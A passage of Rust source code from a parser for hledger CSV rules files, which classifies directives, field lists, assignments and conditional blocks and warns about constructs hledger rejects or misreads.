    sanitize_display(line, LABEL_MAX_CHARS)
}

/// Make `text` safe and short enough to drop straight into a GUI, in at most
/// `max_chars` `char`s.
///
/// Shared with [`discovery`]'s CSV cell sanitizer, which wants the same three
/// transformations at a different width — a rules-file item label and a bank
/// CSV cell are both attacker-influenced strings headed for the same dialog, and
/// two copies of this would be two places to fix a `char`-boundary bug.
///
/// The truncation counts **`char`s, not bytes**, so it can never split a code
/// point; a `String` sliced at a byte offset is a panic waiting for the first
/// non-ASCII description.
fn sanitize_display(text: &str, max_chars: usize) -> String {
    let printable = text
        .chars()
        .filter(|c| !c.is_control() || c.is_whitespace())
        .collect::<String>();
    let collapsed = printable.split_whitespace().collect::<Vec<_>>().join(" ");
    if collapsed.chars().count() <= max_chars {
        return collapsed;
    }
    collapsed
        .chars()
        .take(max_chars.saturating_sub(1))
        .chain(std::iter::once('…'))
        .collect()
}

/// A `u32` item index. Every item spans at least one byte, so a document with
/// more than `u32::MAX` items would exceed 4 GiB — six orders of magnitude past
/// the 2-8 KB rules files this models. Saturating beats panicking either way.
fn item_id(index: usize) -> ItemId {
    ItemId(u32::try_from(index).unwrap_or(u32::MAX))
}

/// A 1-based line number from a 0-based line index, saturating for the same
/// reason as [`item_id`].
fn line_number(index: usize) -> u32 {
    u32::try_from(index + 1).unwrap_or(u32::MAX)
}

/// Which of the three extent rules a line starts.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Construct {
    IfTable,
    IfBlock,
    Line,
}

/// A body extent plus what produced it.
struct Body {
    /// Exclusive end line index.
    end: usize,
    /// Which extent rule produced `end`, and therefore which classifier runs.
    construct: Construct,
    /// A complaint hledger would make about this construct, if any.
    warning: Option<String>,
}

/// `text`'s lines, each span **including its terminator**, offset by `base`.
///
/// `base` exists so the renderer can index the lines of one item's body with the
/// same absolute offsets its typed leaves use, without re-scanning the document.
fn line_spans(text: &str, base: usize) -> Vec<Span> {
    text.split_inclusive('\n')
        .scan(base, |start, line| {
            let span = *start..*start + line.len();
            *start = span.end;
            Some(span)
        })
        .collect()
}

/// `text` split into lines, each span including its terminator, with the
/// line-shape predicates the extent rules are written in terms of.
struct LineIndex<'a> {
    text: &'a str,
    spans: Vec<Span>,
}

impl<'a> LineIndex<'a> {
    fn new(text: &'a str) -> Self {
        Self {
            text,
            spans: line_spans(text, 0),
        }
    }

    fn len(&self) -> usize {
        self.spans.len()
    }

    /// The line's text with its terminator removed, on [`str::lines`] rules: a
    /// trailing `\n` goes, and a `\r` goes only because it preceded that `\n`. A
    /// lone `\r` is content, exactly as `parse.rs` sees it (DL-1).
    fn content(&self, index: usize) -> &'a str {
        self.spans.get(index).map_or("", |span| {
            let raw = &self.text[span.clone()];
            raw.strip_suffix('\n')
                .map_or(raw, |line| line.strip_suffix('\r').unwrap_or(line))
        })
    }

    /// Byte offset where line `index` starts; `text.len()` one past the end, so
    /// spans close cleanly at EOF.
    fn offset(&self, index: usize) -> usize {
        self.spans
            .get(index)
            .map_or(self.text.len(), |span| span.start)
    }

    /// `^$` — nothing at all before the terminator. Ends a conditional block or
    /// table.
    fn is_empty(&self, index: usize) -> bool {
        self.content(index).is_empty()
    }

    /// `^[ \t]*$`. A superset of [`LineIndex::is_empty`]; the difference is what
    /// keeps an indented whitespace-only line inside a block body.
    fn is_blank(&self, index: usize) -> bool {
        self.content(index)
            .bytes()
            .all(|byte| byte == b' ' || byte == b'\t')
    }

    /// `^[ \t]*[;#*]`. Only asked *outside* a conditional block's matcher run —
    /// inside one, hledger reads such a line as a regex.
    fn is_comment(&self, index: usize) -> bool {
        self.content(index)
            .trim_start_matches([' ', '\t'])
            .starts_with([';', '#', '*'])
    }

    fn is_trivia(&self, index: usize) -> bool {
        self.is_blank(index) || self.is_comment(index)
    }

    /// `^[ \t]` — an assignment line inside a conditional block.
    fn is_indented(&self, index: usize) -> bool {
        self.content(index).starts_with([' ', '\t'])
    }

    /// A matcher line: column 1, non-space (hledger's `regexp` opens with
    /// `nonspace`). False for an empty line and for an indented one, which is
    /// what ends the matcher run.
    fn is_matcher(&self, index: usize) -> bool {
        self.content(index)
            .chars()
            .next()
            .is_some_and(|c| !c.is_whitespace())
    }

    fn construct_at(&self, index: usize) -> Construct {
        let Some(rest) = self.content(index).strip_prefix("if") else {
            return Construct::Line;
        };
        match rest.chars().next() {
            // `if` alone on the line, or `if MATCHER`.
            None => Construct::IfBlock,
            Some(c) if c.is_whitespace() => Construct::IfBlock,
            // `if,` / `if|` / `if;` — the char is the table's separator.
            Some(c) if !c.is_alphanumeric() => Construct::IfTable,
            // `ifx`: not a conditional at all.
            Some(_) => Construct::Line,
        }
    }

    /// Where the construct starting at `start` ends, per the extent table in the
    /// module docs.
    fn body_at(&self, start: usize) -> Body {
        match self.construct_at(start) {
            Construct::IfTable => {
                let end = (start + 1..self.len())
                    .find(|&i| self.is_empty(i))
                    .unwrap_or(self.len());
                Body {
                    end,
                    construct: Construct::IfTable,
                    warning: (end == start + 1).then(|| {
                        "conditional table has no data rows; hledger rejects an empty table".into()
                    }),
                }
            }
            Construct::IfBlock => {
                let matchers_end = (start + 1..self.len())
                    .find(|&i| !self.is_matcher(i))
                    .unwrap_or(self.len());
                let end = (matchers_end..self.len())
                    .find(|&i| !self.is_indented(i))
                    .unwrap_or(self.len());
                Body {
                    end,
                    construct: Construct::IfBlock,
                    warning: (end == matchers_end).then(|| {
                        "conditional block has no indented assignment lines; hledger rejects it"
                            .into()
                    }),
                }
            }
            Construct::Line => Body {
                end: start + 1,
                construct: Construct::Line,
                warning: self.is_indented(start).then(|| {
                    "indented line outside a conditional block; hledger expects rules at column 1"
                        .into()
                }),
            },
        }
    }

    /// Assemble the whole document into paragraphs. The single place the tiling
    /// invariant is established: `cursor` only ever moves forward, and every item
    /// spans exactly `[offset(cursor_before), offset(cursor_after))`.
    fn paragraphs(&self) -> (Vec<Item>, Vec<Warning>) {
        let mut items: Vec<Item> = Vec::new();
        let mut warnings: Vec<Warning> = Vec::new();
        let mut cursor = 0usize;

        while cursor < self.len() {
            let trivia_end = (cursor..self.len())
                .find(|&i| !self.is_trivia(i))
                .unwrap_or(self.len());

            // A trivia run with no body below it is its own item.
            if trivia_end == self.len() {
                items.push(self.trivia(items.len(), cursor, trivia_end));
                break;
            }

            // The leading run is the *contiguous comment* run directly above the
            // body: walking back stops at the first blank line, so a blank line
            // is never absorbed upward.
            let lead_start = (cursor..trivia_end)
                .rev()
                .take_while(|&i| self.is_comment(i))
                .last()
                .unwrap_or(trivia_end);
            if lead_start > cursor {
                items.push(self.trivia(items.len(), cursor, lead_start));
            }

            let body = self.body_at(trivia_end);
            let span_end = (body.end..self.len())
                .find(|&i| !self.is_blank(i))
                .unwrap_or(self.len());
            let id = item_id(items.len());
            let line = line_number(trivia_end);

            let classified = self.classify(trivia_end, body.end, body.construct);
            warnings.extend(
                body.warning
                    .into_iter()
                    .chain(classified.warning)
                    .map(|message| Warning {
                        item: Some(id),
                        line,
                        message,
                    }),
            );
            items.push(Item {
                id,
                span: self.offset(lead_start)..self.offset(span_end),
                body: self.offset(trivia_end)..self.offset(body.end),
                line,
                // Classification only ever chooses a `kind`; both arms leave the
                // spans above exactly as the extent rules computed them.
                kind: classified.kind.unwrap_or_else(|reason| {
                    ItemKind::Opaque(Opaque {
                        reason,
                        label: sanitize_label(self.content(trivia_end)),
                        lines: u32::try_from(body.end - trivia_end).unwrap_or(u32::MAX),
                    })
                }),
            });
            cursor = span_end;
        }

        (items, warnings)
    }

    /// Classify the construct on lines `[start, end)`.
    ///
    /// The extent rules already ran; this only chooses a [`ItemKind`], and it is
    /// deliberately incapable of returning a different extent.
    fn classify(&self, start: usize, end: usize, construct: Construct) -> Classified {
        match construct {
            // Rule 1. A table's rows are positional, so an edit to its header
            // silently re-points every row — never editable here.
            Construct::IfTable => Classified::opaque(OpaqueReason::IfTable),
            // A conditional `account2` is the *likelier* place for the mistake
            // than a top-level one, so its assignments are checked too. One
            // warning per item, the first offender, matching `classify_fields`.
            Construct::IfBlock => match self.classify_block(start, end) {
                Ok(block) => Classified {
                    warning: block.assignments.iter().find_map(|assignment| {
                        account_comment_warning(
                            assignment.field,
                            &self.text[assignment.value_span.clone()],
                        )
                    }),
                    kind: Ok(ItemKind::IfBlock(block)),
                },
                Err(reason) => Classified::opaque(reason),
            },
            Construct::Line => classify_line(self.content(start), self.offset(start)),
        }
    }

    /// Rules 2-7 from the module docs, in order, over one conditional block.
    fn classify_block(&self, start: usize, end: usize) -> Result<IfBlock, OpaqueReason> {
        let header = header_matcher(self.content(start), self.offset(start));
        let layout = if header.is_some() {
            IfLayout::Inline
        } else {
            IfLayout::Stacked
        };
        // The matcher run ends where the assignment run begins — the same
        // column-1 test `body_at` used to find `end`, re-asked inside the body.
        let matchers_end = (start + 1..end)
            .find(|&i| !self.is_matcher(i))
            .unwrap_or(end);

        // Rules 2-4. Grouping is decided HERE, because it is a property of a
        // line's position in the run rather than of the line on its own:
        // `& X` extends the group above it, anything else starts a new one.
        // `classify_matcher` sees only the already-`&`-stripped text.
        let groups = header
            .into_iter()
            .chain((start + 1..matchers_end).map(|i| trimmed(self.content(i), self.offset(i))))
            .try_fold(
                Vec::<MatcherGroup>::new(),
                |mut groups, (text, at)| match and_continuation(text, at) {
                    // A leading `&` with no group above it AND-s with nothing.
                    // hledger 1.52 accepts it as a no-op; this module declines
                    // rather than promise an edit preserves a degenerate form.
                    Some(_) if groups.is_empty() => Err(OpaqueReason::CombinedMatcher),
                    Some((text, at)) => {
                        let matcher = classify_matcher(text, at)?;
                        groups
                            .last_mut()
                            .expect("a continuation has a group above it")
                            .matchers
                            .push(matcher);
                        Ok(groups)
                    }
                    None => {
                        let matcher = classify_matcher(text, at)?;
                        groups.push(MatcherGroup {
                            matchers: vec![matcher],
                        });
                        Ok(groups)
                    }
                },
            )?;

        // Rules 5-6. A whitespace-only line is a no-op hledger consumes, so it
        // is skipped rather than rejected.
        let assignments = self
            .body_lines(matchers_end, end)
            .map(|(content, at)| {
                assignment_at(content, at, leading_space(content))
                    .ok_or(OpaqueReason::UnparsedBlockBody)
                    .and_then(|assignment| match assignment.field {
                        HledgerField::Control(_) => Err(OpaqueReason::ControlFlowInBlock),
                        _ => Ok(assignment),
                    })
            })
            .collect::<Result<Vec<_>, _>>()?;

        // Rule 7, both halves. The first non-blank body line is necessarily the
        // first assignment line, every body line having parsed above.
        if groups.is_empty() {
            return Err(OpaqueReason::Unclassified);
        }
        let indent = self
            .body_lines(matchers_end, end)
            .next()
            .map(|(content, at)| at..at + leading_space(content))
            .ok_or(OpaqueReason::Unclassified)?;

        Ok(IfBlock {
            layout,
            groups,
            assignments,
            indent,
        })
    }

    /// A conditional block's non-blank body lines, as `(content, offset)`.
    fn body_lines(&self, from: usize, to: usize) -> impl Iterator<Item = (&'a str, usize)> {
        (from..to)
            .map(|i| (self.content(i), self.offset(i)))
            .filter(|(content, _)| !token(content).is_empty())
    }

    /// A [`ItemKind::Trivia`] item over `[start, end)`. Its body equals its span:
    /// there is no construct to point at, and `line` should still name the run's
    /// first line.
    fn trivia(&self, index: usize, start: usize, end: usize) -> Item {
        let span = self.offset(start)..self.offset(end);
        Item {
            id: item_id(index),
            body: span.clone(),
            span,
            line: line_number(start),
            kind: ItemKind::Trivia,
        }
    }
}

// ---------------------------------------------------------------------------
// Classification
// ---------------------------------------------------------------------------

/// What classifying one construct produced.
struct Classified {
    /// The typed kind, or the first rule that declined to promise one.
    kind: Result<ItemKind, OpaqueReason>,
    /// A complaint hledger would make, beyond anything the extent rules found.
    warning: Option<String>,
}

impl Classified {
    fn of(kind: Result<ItemKind, OpaqueReason>) -> Self {
        Self {
            kind,
            warning: None,
        }
    }

    fn typed(kind: ItemKind) -> Self {
        Self::of(Ok(kind))
    }

    fn opaque(reason: OpaqueReason) -> Self {
        Self::of(Err(reason))
    }
}

/// How many leading bytes of `s` are spaces or tabs.
///
/// Space-and-tab, not `char::is_whitespace`: this is hledger's
/// `skipNonNewlineSpaces`, and a newline must never be eaten by it.
fn leading_space(s: &str) -> usize {
    s.len() - s.trim_start_matches([' ', '\t']).len()
}

/// `s` with surrounding spaces and tabs removed.
fn token(s: &str) -> &str {
    s.trim_matches([' ', '\t'])
}

/// [`token`] plus the absolute offset of what survived the trim.
fn trimmed(content: &str, base: usize) -> (&str, usize) {
    (token(content), base + leading_space(content))
}

/// hledger's eleven rules-file directives.
///
/// No keyword here is a prefix of another, so first-match is unambiguous — and
/// [`classify_directive`] additionally requires a separator after the keyword,
/// which is what stops `sourced` from being read as `source`.
const DIRECTIVES: &[(&str, DirectiveName)] = &[
    ("intra-day-reversed", DirectiveName::IntraDayReversed),
    ("newest-first", DirectiveName::NewestFirst),
    ("decimal-mark", DirectiveName::DecimalMark),
    ("balance-type", DirectiveName::BalanceType),
    ("date-format", DirectiveName::DateFormat),
    ("separator", DirectiveName::Separator),
    ("encoding", DirectiveName::Encoding),
    ("timezone", DirectiveName::Timezone),
    ("archive", DirectiveName::Archive),
    ("source", DirectiveName::Source),
    ("skip", DirectiveName::Skip),
];

/// Where a directive's value starts within `rest` (what follows the keyword), or
/// `None` if there is no separator and so no directive.
///
/// hledger's `directivep` accepts `KEYWORD`, `KEYWORD:`, `KEYWORD VALUE`,
/// `KEYWORD: VALUE` and `KEYWORD:VALUE` — a `:` with optional following spaces,
/// or at least one space, or nothing at all before end of line.
fn directive_value_start(rest: &str) -> Option<usize> {
    if rest.is_empty() {
        return Some(0);
    }
    if let Some(after_colon) = rest.strip_prefix(':') {
        return Some(1 + leading_space(after_colon));
    }
    let spaces = leading_space(rest);
    (spaces > 0).then_some(spaces)
}

/// Classify a line as one of the eleven directives.
///
/// `None` means "not a directive line"; `Some(Err(_))` means "a directive whose
/// value this module will not guess at", which is a *different* answer and the
/// reason the return type is nested.
fn classify_directive(content: &str, base: usize) -> Option<Result<Directive, OpaqueReason>> {
    let &(keyword, name) = DIRECTIVES
        .iter()
        .find(|(keyword, _)| content.starts_with(keyword))?;
    let start = keyword.len() + directive_value_start(&content[keyword.len()..])?;
    let raw = &content[start..];

    // The token-shaped values are read from the trimmed text because hledger
    // tolerates surrounding whitespace on them; the free-text ones are not,
    // because for `date-format` the trailing space really is in the format.
    let value = match name {
        DirectiveName::Source => Some(DirectiveValue::Source {
            raw: raw.to_string(),
            has_command: raw.contains('|'),
        }),
        DirectiveName::Archive | DirectiveName::NewestFirst | DirectiveName::IntraDayReversed => {
            Some(DirectiveValue::Flag)
        }
        DirectiveName::Encoding | DirectiveName::DateFormat | DirectiveName::Timezone => {
            Some(DirectiveValue::Text(raw.to_string()))
        }
        DirectiveName::Separator => separator_value(token(raw)).map(DirectiveValue::Separator),
        DirectiveName::DecimalMark => match token(raw) {
            "." => Some(DirectiveValue::DecimalMark('.')),
            "," => Some(DirectiveValue::DecimalMark(',')),
            _ => None,
        },
        DirectiveName::Skip => match token(raw) {
            // A bare `skip` means 1, which is what hledger does.
            "" => Some(DirectiveValue::Skip(1)),
            count => count.parse().ok().map(DirectiveValue::Skip),
        },
        DirectiveName::BalanceType => {
            balance_type_value(token(raw)).map(DirectiveValue::BalanceType)
        }
    };

    Some(value.map_or(Err(OpaqueReason::UnparsedDirective), |value| {
        Ok(Directive {
            name,
            name_span: base..base + keyword.len(),
            value_span: base + start..base + content.len(),
            value,
        })
    }))
}

/// Read a directive given as a **keyword and a value**, exactly as
/// [`classify_directive`] reads the same two pieces written on one line.
///
/// This is the entry point a wire layer needs: a client names a directive with
/// a string and gives its value with a string, and something has to turn that
/// pair into the typed [`DirectiveName`] + [`DirectiveValue`] an [`ItemBody`]
/// carries. Doing it here — by synthesizing the line and handing it to the
/// parser — means there is exactly ONE interpretation of `skip`, `separator`
/// and friends in the codebase. A second table in the server would be free to
/// decide that `separator TAB` means something else, and both sides would still
/// compile and pass.
///
/// `None` for a keyword that is not one of the eleven, or a value this module
/// will not guess at (`skip abc`, `decimal-mark ..`) — the same refusal
/// [`OpaqueReason::UnparsedDirective`] records when reading a file.
///
/// **A `value` that begins with a space or a tab is refused**, because hledger's
/// `directivep` consumes the run between the keyword and the value: the leading
/// whitespace could not survive being written and read back, so accepting it
/// would mean reporting success for a value that is not what was asked for.
///
/// Space and tab specifically, matching [`leading_space`] — *not*
/// `char::is_whitespace`. A value beginning with U+00A0 round-trips perfectly
/// (nothing in this module or in hledger's grammar treats it as a separator),
/// so refusing it would reject a value the file can hold.
#[must_use]
pub fn parse_directive(keyword: &str, value: &str) -> Option<(DirectiveName, DirectiveValue)> {
    if value.starts_with([' ', '\t']) {
        return None;
    }
    let line = if value.is_empty() {
        keyword.to_string()
    } else {
        format!("{keyword} {value}")
    };
    match classify_directive(&line, 0)? {
        Ok(directive) => Some((directive.name, directive.value)),
        Err(_) => None,
    }
}

/// A `separator` value: one character, or the word `tab`/`space` in any case.
fn separator_value(token: &str) -> Option<Separator> {
    if token.eq_ignore_ascii_case("tab") {
        return Some(Separator::Tab {
            raw: token.to_string(),
        });
    }
    if token.eq_ignore_ascii_case("space") {
        return Some(Separator::Space {
            raw: token.to_string(),
        });
    }
    token.chars().exactly_one().ok().map(Separator::Char)
}

/// A `balance-type` value.
fn balance_type_value(token: &str) -> Option<BalanceType> {
    match token {
        "=" => Some(BalanceType::Simple),
        "=*" => Some(BalanceType::Inclusive),
        "==" => Some(BalanceType::Total),
        "==*" => Some(BalanceType::TotalInclusive),
        _ => None,
    }
}

/// Classify an `include RULESFILE` line.
///
/// hledger's `includedirectivep` demands at least one space after the keyword
/// and takes the rest of the line as the filename, so `include:x` and a bare
/// `include` are not includes at all. The target is never opened here.
fn classify_include(content: &str, base: usize) -> Option<Include> {
    let rest = content.strip_prefix("include")?;
    let gap = leading_space(rest);
    let start = "include".len() + gap;
    let target = &content[start..];
    (gap > 0 && !target.is_empty()).then(|| Include {
        target: target.to_string(),
        target_span: base + start..base + content.len(),
    })
}

/// One bare name in a `fields` list.
///
/// Ends at whitespace, `,`, `;` or `#`. The last two are the tail-starters
/// verified against hledger 1.52: `fields date, a#b, amount` really does mean
/// the names `date` and `a`, with `#b, amount` discarded.
fn field_list_name(s: &str) -> &str {
    &s[..s.find([' ', '\t', ',', ';', '#']).unwrap_or(s.len())]
}

/// Classify a `fields` list, and note anything hledger would reject about it.
///
/// `None` means "not a `fields` line". hledger's `fieldnamelistp` requires at
/// least one space after the keyword and any `:`, so `fields:date` is not one.
fn classify_fields(
    content: &str,
    base: usize,
) -> Option<Result<(Fields, Option<String>), OpaqueReason>> {
    let after_keyword = content.strip_prefix("fields")?;
    let colon = usize::from(after_keyword.starts_with(':'));
    let gap = leading_space(&after_keyword[colon..]);
    if gap == 0 {
        return None;
    }

    let mut cursor = "fields".len() + colon + gap;
    let mut names = Vec::new();
    let mut name_spans = Vec::new();
    loop {
        let name = field_list_name(&content[cursor..]);
        // hledger accepts `"a quoted name"`; reporting a name list this module
        // would have to guess at is worse than declining to report one.
        if name.starts_with('"') {
            return Some(Err(OpaqueReason::Unclassified));
        }
        names.push(name.to_string());
        name_spans.push(base + cursor..base + cursor + name.len());
        cursor += name.len();

        // hledger's separator is `spaces , spaces`, so a space before the comma
        // is fine — but a space followed by anything else is not, and that is
        // what the tail warning below is about.
        let gap = leading_space(&content[cursor..]);
        if !content[cursor + gap..].starts_with(',') {
            break;
        }
        cursor += gap + 1;
        cursor += leading_space(&content[cursor..]);
    }

    let tail = &content[cursor..];
    let warning = if tail.starts_with([' ', '\t']) {
        Some(
            "hledger rejects a `fields` list followed by whitespace; only text touching the last \
             name is discarded"
                .to_string(),
        )
    } else if names.len() < 2 {
        Some("hledger requires at least two comma-separated field names".to_string())
    } else {
        None
    };

    Some(Ok((
        Fields {
            names,
            name_spans,
            tail_span: base + cursor..base + content.len(),
        },
        warning,
    )))
}

/// The leading run of characters an hledger field name can be spelled with.
///
/// Reading the whole run and *then* looking it up is what gives longest-first
/// matching for free: `account10` is one name, and `account100` is no name at
/// all — which is also hledger's answer, since its separator parser has nowhere
/// to go after the `account10` it matched.
fn field_name_run(s: &str) -> &str {
    let end = s
        .find(|c: char| !(c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-'))
        .unwrap_or(s.len());
    &s[..end]
}

/// The families of field name that take a posting number.
///
/// Order does not matter: no base is a prefix of another, so at most one can
/// match. `amount` is the only one that also carries an `-in`/`-out` suffix.
const NUMBERED_BASES: &[(&str, NumberedField)] = &[
    ("account", NumberedField::Account),
    ("comment", NumberedField::Comment),
    ("currency", NumberedField::Currency),
    ("balance", NumberedField::Balance),
    ("amount", NumberedField::Amount),
];

/// An hledger field name, or `None` if this is not one.
///
/// Public so a client-supplied field name is turned into an [`HledgerField`] by
/// the *parser's* table, not a second one: a name this returns `None` for is a
/// name hledger would not read as a field either, which is exactly the answer a
/// write path wants. Note that it accepts [`ControlField`] names too; whether
/// one may be *written* is the edit policy's question, not this one's, and
/// [`RulesDoc::apply`] is where it is asked.
#[must_use]
pub fn hledger_field(name: &str) -> Option<HledgerField> {
    match name {
        "date" => Some(HledgerField::Date),
        "date2" => Some(HledgerField::Date2),
        "status" => Some(HledgerField::Status),
        "code" => Some(HledgerField::Code),
        "description" => Some(HledgerField::Description),
        "comment" => Some(HledgerField::Comment),
        "amount" => Some(HledgerField::Amount),
        "amount-in" => Some(HledgerField::AmountIn),
        "amount-out" => Some(HledgerField::AmountOut),
        "currency" => Some(HledgerField::Currency),
        "balance" => Some(HledgerField::Balance),
        "skip" => Some(HledgerField::Control(ControlField::Skip)),
        "end" => Some(HledgerField::Control(ControlField::End)),
        _ => numbered_field(name),
    }
}

/// A numbered field name such as `account2`, `comment3` or `amount1-out`.
fn numbered_field(name: &str) -> Option<HledgerField> {
    NUMBERED_BASES.iter().find_map(|&(prefix, family)| {
        let rest = name.strip_prefix(prefix)?;
        let (digits, base) = match (family, rest.strip_suffix("-in"), rest.strip_suffix("-out")) {
            (NumberedField::Amount, Some(digits), _) => (digits, NumberedField::AmountIn),
            (NumberedField::Amount, _, Some(digits)) => (digits, NumberedField::AmountOut),
            _ => (rest, family),
        };
        field_index(digits).map(|n| HledgerField::Numbered { base, n })
    })
}

/// A posting number, `1..=99`, spelled the way hledger spells it.
///
/// `account01` is rejected: hledger's name list is built from `show <$> [1..99]`,
/// so a leading zero produces a name that is simply not in it.
fn field_index(digits: &str) -> Option<u8> {
    let n: u8 = digits.parse().ok()?;
    ((1..=99).contains(&n) && n.to_string() == digits).then_some(n)
}

/// Parse `content[offset..]` as a field assignment.
///
/// hledger's separator is optional spaces, an optional `:`, then optional
/// spaces — but the whole thing may only be empty at end of line, which is what
/// rejects `account100 x`. The value then runs verbatim to end of line, with no
/// comment stripping: a `;` in it belongs to the value.
fn assignment_at(content: &str, base: usize, offset: usize) -> Option<Assignment> {
    let rest = &content[offset..];
    let name = field_name_run(rest);
    let field = hledger_field(name)?;

    let after = &rest[name.len()..];
    let lead = leading_space(after);
    let sep = match after[lead..].strip_prefix(':') {
        Some(after_colon) => lead + 1 + leading_space(after_colon),
        None => lead,
    };
    if sep == 0 && !after.is_empty() {
        return None;
    }

    let name_end = offset + name.len();
    Some(Assignment {
        field,
        field_span: base + offset..base + name_end,
        sep_span: base + name_end..base + name_end + sep,
        value_span: base + name_end + sep..base + content.len(),
    })
}

/// The complaint for an `accountN` whose value carries what was meant as a
/// trailing comment.
///
/// **This warns; it does not strip.** A CSV rules file has no end-of-line
/// comments — the manual's cheatsheet allows only whole lines "beginning with #
/// or ; or *" — and [`assignment_at`] reproduces that faithfully. Stripping here
/// would be a private dialect: the import is run by the real `hledger` binary, so
/// a value this module trimmed would still reach the journal untrimmed, and the
/// panel would be describing an import that never happens. Being wrong in the
/// same way hledger is wrong is the whole contract; saying so is the fix.
///
/// **Two spaces do not make it a comment, and that is the trap.** A *journal*
/// posting takes an end-of-line comment after two spaces, so the habit
/// transfers — but a rules file is not a journal. Verified against hledger 1.52:
/// one space silently folds the text into the account name, and two spaces are a
/// hard parse error ("unexpected space, expecting end of input"). Neither is a
/// comment, so there is no spacing that rescues the line.
///
/// Only `accountN` is worth a warning. `amountN` already fails loudly ("could
/// not parse … as an amount"), `commentN` *is* a comment so a `;` in it is
/// ordinary text, and `description` merely carries the characters into a
/// description that still reads as one. Only an account name is silently
/// absorbed and then looks fine — the imported posting lands in an account
/// literally called `expenses:unknown ; why`, which hledger will happily keep
/// re-reading forever.
///
/// `#` is deliberately **not** flagged, though it also opens a whole-line rules
/// comment: `assets:card #1234` is a plausible account name, and a warning that
/// fires on real files is one people learn to scroll past. `;` has no such
/// innocent reading.
fn account_comment_warning(field: HledgerField, value: &str) -> Option<String> {
    let n = match field {
        HledgerField::Numbered {
            base: NumberedField::Account,
            n,
        } => Some(n),
        _ => None,
    }?;
    value.contains(';').then(|| {
        format!(
            "`account{n}`'s value contains a `;`, but a rules file has no end-of-line \
             comments — hledger reads the rest of the line as part of the account name, \
             so this imports into an account literally named `{}`. Move the note to a \
             line of its own above (two spaces before the `;` will not help: hledger \
             rejects that outright).",
            sanitize_display(value, LABEL_MAX_CHARS)
        )
    })
}

/// Does `pattern` contain an unescaped `(`, and therefore a capture group?
///
/// `\(` is escaped and does not count; `\\(` does, the backslash having escaped
/// itself. A paren that cannot actually capture — inside a character class
/// (`[(]`), or opening a non-capturing group (`(?:…)`) — is nonetheless *counted*:
/// telling those from a real group needs a regex parser, and declining costs only
/// editability while guessing wrong would let an edit break a `\N` backreference.
fn has_match_group(pattern: &str) -> bool {
    pattern
        .chars()
        .fold((false, false), |(escaped, found), c| match c {
            _ if escaped => (false, found),
            '\\' => (true, found),
            '(' => (false, true),
            _ => (false, found),
        })
        .1
}

/// `%NAME ` at the head of a matcher: the name, and where its pattern starts.
///
/// `None` when the text is not a well-formed field reference *followed by a
/// pattern* — hledger's `try fieldmatcherp <|> recordmatcherp` then reads the
/// whole thing as a whole-record regex, and so does the caller.
fn field_scope(text: &str) -> Option<(&str, usize)> {
    let rest = text.strip_prefix('%')?;
    let name = &rest[..rest.find([' ', '\t']).unwrap_or(rest.len())];
    let gap = leading_space(&rest[name.len()..]);
    let pattern_at = '%'.len_utf8() + name.len() + gap;
    (!name.is_empty() && gap > 0 && pattern_at < text.len()).then_some((name, pattern_at))
}

/// The matcher on an `if MATCHER` header line, if there is one.
fn header_matcher(header: &str, base: usize) -> Option<(&str, usize)> {
    let rest = header.strip_prefix("if")?;
    let (text, at) = trimmed(rest, base + "if".len());
    (!text.is_empty()).then_some((text, at))
}

/// A line-prefix `&` AND-continuation: the matcher after it, and where that
/// matcher starts.
///
/// `None` for anything that is not **exactly one** `&` followed by a pattern, so
/// the caller falls through to [`classify_matcher`] and the line is refused
/// there:
///
/// - `&&…` — hledger 1.52 reads a leading `&&` as an AND join too, but this
///   module cannot tell that from a `&&` inside one regex without hledger's own
///   parser, so both stay [`OpaqueReason::CombinedMatcher`]. See the module
///   docs' divergences.
/// - a bare `&` — hledger rejects the file outright ("unexpected newline,
///   expecting conditional block"), verified against the binary.
///
/// Whitespace after the `&` is optional and is not part of the pattern:
/// `&DOWNTOWN`, `& DOWNTOWN` and `&\tDOWNTOWN   ` are the same matcher to
/// hledger, all verified against 1.52. Whitespace *before* the `&` is not
/// allowed at all, and needs no check here: an indented line is not in the
/// matcher run ([`LineIndex::is_matcher`]), which is also how hledger reads it.
fn and_continuation(text: &str, base: usize) -> Option<(&str, usize)> {
    let rest = text
        .strip_prefix('&')
        .filter(|rest| !rest.starts_with('&'))?;
    let (rest, at) = trimmed(rest, base + '&'.len_utf8());
    (!rest.is_empty()).then_some((rest, at))
}

/// Rules 2-4 from the module docs, over one already-trimmed matcher whose `&`
/// AND-prefix, if it had one, the caller has already taken off.
fn classify_matcher(text: &str, base: usize) -> Result<Matcher, OpaqueReason> {
    // Rule 2, what is left of it once `and_continuation` has claimed the plain
    // `&` chains: a `!` negation, a `&&` anywhere — telling "joins two matchers"
    // from "is two ampersands in one regex" needs hledger's own parser — and a
    // leading `&` that got here, which is one `and_continuation` refused.
    if text.starts_with(['&', '!']) || text.contains("&&") {
        return Err(OpaqueReason::CombinedMatcher);
    }

    let (scope, field_span, pattern_at) = match field_scope(text) {
        Some((name, pattern_at)) => (
            MatchScope::Field(name.to_string()),
            Some(base + '%'.len_utf8()..base + '%'.len_utf8() + name.len()),
            pattern_at,
        ),
        None => (MatchScope::WholeRecord, None, 0),
    };
    let pattern = &text[pattern_at..];

    // Rule 3, then rule 4 — the module docs' order, so `;(x)` reports the group.
    if has_match_group(pattern) {
        return Err(OpaqueReason::MatchGroup);
    }
    if pattern.starts_with([';', '#', '*']) {
        return Err(OpaqueReason::CommentLikeMatcher);
    }

    Ok(Matcher {
        scope,
        pattern: pattern.to_string(),
        pattern_span: base + pattern_at..base + text.len(),
        field_span,
    })
}

/// Classify a one-line construct.
///
/// The order mirrors hledger's `rulesp`, and it is load-bearing exactly once:
/// `skip` is a directive keyword *and* a field name, and trying directives first
/// is what makes a top-level `skip 1` the directive it is.
fn classify_line(content: &str, base: usize) -> Classified {
    if let Some(directive) = classify_directive(content, base) {
        return Classified::of(directive.map(ItemKind::Directive));
    }
    if let Some(fields) = classify_fields(content, base) {
        return match fields {
            Ok((fields, warning)) => Classified {
                kind: Ok(ItemKind::Fields(fields)),
                warning,
            },
            Err(reason) => Classified::opaque(reason),
        };
    }
    if let Some(assignment) = assignment_at(content, base, 0) {
        // `value_span` runs to end of line, so it is `content` from the value's
        // start — no second slice of the whole document needed.
        let warning = account_comment_warning(
            assignment.field,
            &content[assignment.value_span.start - base..],
        );
        return Classified {
            kind: Ok(ItemKind::Assignment(assignment)),
            warning,
        };
    }
    if let Some(include) = classify_include(content, base) {
        return Classified::typed(ItemKind::Include(include));
    }
